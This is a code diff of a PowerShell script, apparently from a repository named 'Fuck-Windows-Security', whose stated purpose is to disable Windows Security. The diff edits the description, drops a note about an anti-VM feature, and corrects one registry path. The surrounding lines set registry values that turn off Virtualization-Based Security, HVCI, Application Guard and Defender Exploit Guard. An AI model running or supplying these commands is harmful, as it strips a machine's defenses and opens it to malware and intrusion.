@@ -14,10 +14,9 @@
 
 <#
 .SYNOPSIS
-    This script is designed to disable Window Security features via regedit.
+    This script is designed to disable Window Security.
 .NOTES
     This script was NOT optimized to shorten and obfuscate the code but rather intended to have as much readability as possible for new coders to learn!
-    Edit: Anti-VM feature has been added. *09-08-2024*
 .LINK
     https://github.com/isPique/Fuck-Windows-Security
 #>
@@ -468,7 +467,7 @@ Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -prope
 Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -properties @{"EnableVirtualizationBasedSecurity" = 0; "RequirePlatformSecurityFeatures" = 0; "HVCIMATRequired" = 0}
 
 # Disable Application Guard
-Set-RegistryProperties -path "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Hvsi" -properties @{"Enabled" = 0}
+Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Hvsi" -properties @{"Enabled" = 0}
 
 # Disable Windows Defender Exploit Guard
 Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard" -properties @{"EnableExploitProtection" = 0}
